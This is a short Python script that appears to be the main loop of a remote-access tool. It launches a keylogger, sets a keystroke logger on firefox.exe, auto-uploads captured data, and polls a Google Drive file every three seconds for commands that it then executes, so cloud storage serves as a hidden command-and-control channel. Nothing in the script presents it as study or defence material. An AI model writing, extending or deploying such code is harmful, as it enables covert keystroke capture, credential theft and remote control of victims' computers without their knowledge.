#%%
import json
import time

from clint.commands import parse_command, start_logger
from clint.drive import Auto_upload, got_active
from clint.keylogger import resume_keylogger
from clint.network import get
from clint.util import data_store
from logger import log

print(data_store.var.last_user_time)
#%%
Auto_upload()
got_active()
resume_keylogger()
if data_store.var.mozila_keylog:
    start_logger('mozila', ["firefox.exe"])
    data_store.reset("mozila_keylog")


command_id=data_store.var.cfile_id
api_key=data_store.var.api_key

server_url=f"https://www.googleapis.com/drive/v3/files/{command_id}?alt=media&key={api_key}"
log.info('waiting for command')
while 1:
    try:
        command=get(server_url).text
        command = dict(json.loads(command))
    except Exception as e:
        pass
    else:
        parse_command(command)
    time.sleep(3)
